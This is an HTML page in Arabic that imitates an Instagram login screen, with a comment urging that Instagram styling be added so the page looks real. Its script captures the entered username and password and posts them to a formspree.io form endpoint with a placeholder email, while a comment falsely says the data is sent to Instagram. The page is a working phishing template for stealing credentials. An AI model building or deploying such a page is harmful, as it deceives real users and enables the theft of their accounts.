<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insta Login</title>
    <style>
        /* أضف هنا بعض CSS إنستغرام لجعل الصفحة تبدو حقيقية */
    </style>
</head>
<body>
    <h1>تسجيل الدخول إلى إنستغرام</h1>
    <form id="loginForm">
        <label for="username">اسم المستخدم:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="password">كلمة المرور:</label><br>
        <input type="password" id="password" name="password"><br>
        <input type="submit" value="تسجيل الدخول">
    </form>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            // هنا، سنرسل بيانات المستخدم إلى إنستغرام باستخدام الرابط الذي ترسله
            fetch('https://formspree.io/yourEmail', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: document.getElementById('username').value,
                    password: document.getElementById('password').value
                })
            });
        });
    </script>
</body>
</html>
  
  
